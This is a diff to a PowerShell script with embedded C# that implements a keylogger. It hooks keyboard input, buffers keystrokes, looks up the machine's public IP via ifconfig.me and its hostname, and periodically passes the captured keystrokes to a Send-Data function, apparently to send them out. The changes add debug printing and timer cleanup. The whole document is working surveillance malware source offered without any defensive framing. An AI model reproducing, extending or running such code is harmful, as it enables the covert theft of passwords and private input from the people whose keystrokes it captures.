@@ -1,10 +1,9 @@
 function Send-Data($assoc)
 {
-  $res = Invoke-RestMethod -Uri ('http://ipinfo.io/'+(Invoke-WebRequest -uri "http://ifconfig.me/ip").Content)
-  #$ip = $res -match '\d\d?\d?\.\d\d?\d?\.\d\d?\d?\.\d\d?\d?'
-  #$ip = $Matches[0]
-  $ip = '11'
+  Write-Host $assoc
+  $res = Invoke-WebRequest -uri "http://ifconfig.me/ip"
   $hostn = hostname
+  $ip = $res.Content
   $headers = @{
     "Content-Type" = "application/json"
   }
@@ -38,7 +37,7 @@ namespace KeyLogger {
         private static IntPtr hookId = IntPtr.Zero;
         private static System.Threading.Timer stateTimer;
         public static void Run(Action<string> func) {
-
+            
         senddata = func;
         hookId = SetHook(hookProc);
         TimerStart();
@@ -60,6 +59,7 @@ namespace KeyLogger {
             buf += s;
             if (s == "~") {
                 System.Windows.Forms.MessageBox.Show("the keylogger exited");
+                stateTimer.Dispose();
                 Application.Exit();
             }
         }
@@ -79,6 +79,7 @@ namespace KeyLogger {
             Runspace.DefaultRunspace = r;
         }
         try {
+            Console.WriteLine(buf);
             senddata(buf);
             buf = "";
         } catch (Exception e) {
@@ -152,6 +153,7 @@ namespace KeyLogger {
 Add-Type -TypeDefinition $src -ReferencedAssemblies System.Windows.Forms
 [KeyLogger.Program]::Run({
     param($buf)
+    Write-Host $buf
     Send-Data $buf
   });
 
